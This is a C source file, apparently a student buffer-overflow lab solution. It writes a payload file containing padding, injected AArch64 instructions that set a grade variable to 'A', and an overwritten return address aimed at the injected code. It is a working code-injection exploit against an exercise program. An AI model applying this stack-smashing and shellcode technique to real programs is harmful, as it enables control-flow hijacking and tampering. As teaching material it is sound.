/*--------------------------------------------------------------------*/
/* File: createdataA.c                                                */
/*                                                                    */
/* Function: Produces a file called dataA with the student name,      */
/* padding to overrun the stack, and a crafted instruction sequence   */
/* address. This address will overwrite getName's stored x30 and      */
/* redirect execution to a sequence that changes the grade to 'A'.    */
/*                                                                    */
/* Names: Alex Delistathis, Matthew Zhang                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

int main(void) {
   /* create a file pointer and iterator variable */
   FILE *dataA;

   /* Create a variable for the payload address */
   unsigned int payloadAddress;

   /* Create variables for the instructions */
   unsigned int movInstr;
   unsigned int strbInstr;
   unsigned int bInstr;
   
   /* open the file */
   dataA = fopen("dataA", "w+");

   /* write names to file */ 
   fprintf(dataA, "Alex & Matt"); /* 11 characters */ 

   /* write null byte to file */
   putc('\0', dataA);

   /* Calculate the address where the payload will be loaded */
   payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064);
   fwrite(&payloadAddress, sizeof(unsigned int), 1, dataA);

   /* Move 'A' into a register */
   movInstr = MiniAssembler_mov(1, 65); 
   fwrite(&movInstr, sizeof(unsigned int), 1, dataA);

   /* Store 'A' into the grade variable */
   strbInstr = MiniAssembler_strb(1, 0);
   fwrite(&strbInstr, sizeof(unsigned int), 1, dataA);

   /* Branch back to main function after getName */
   bInstr = MiniAssembler_b(0x40089c, 0x420070);
   fwrite(&bInstr, sizeof(unsigned int), 1, dataA);

   /* add padding to overrun the stack */
   fprintf(dataA, "%s", "anganganganganganggg"); /* 20 characters */

   /* write BSS address of adr instruction to file */
   fprintf(dataA, "%c", 0x64);
   fprintf(dataA, "%c", 0x00);
   fprintf(dataA, "%c", 0x42);
   fprintf(dataA, "%c", 0x00);
   fprintf(dataA, "%c", 0x00);
   fprintf(dataA, "%c", 0x00);
   fprintf(dataA, "%c", 0x00);
   fprintf(dataA, "%c", 0x00);
   
   /* close the file */
   fclose(dataA);
   
   return 0;
}